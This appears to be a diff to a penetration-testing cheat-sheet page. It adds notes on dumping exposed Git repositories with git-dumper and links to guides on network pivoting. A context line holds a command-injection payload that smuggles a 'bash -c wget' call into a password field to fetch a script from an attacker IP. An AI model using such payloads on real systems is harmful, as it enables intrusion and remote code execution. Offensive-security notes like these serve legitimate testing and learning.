@@ -111,3 +111,13 @@ password=%0abash%09-c%09"wget%09http://10.10.16.48/1.sh"&backup=
 {% embed url="https://theyhack.me/Proxychains-Double-Pivoting/" %}
 
 {% embed url="https://software-sinner.medium.com/how-to-tunnel-and-pivot-networks-using-ligolo-ng-cf828e59e740" %}
+
+## Git
+
+```
+https://github.com/arthaud/git-dumper
+git status
+git diff --cached [file]
+git show <hash> [in logs]
+
+```
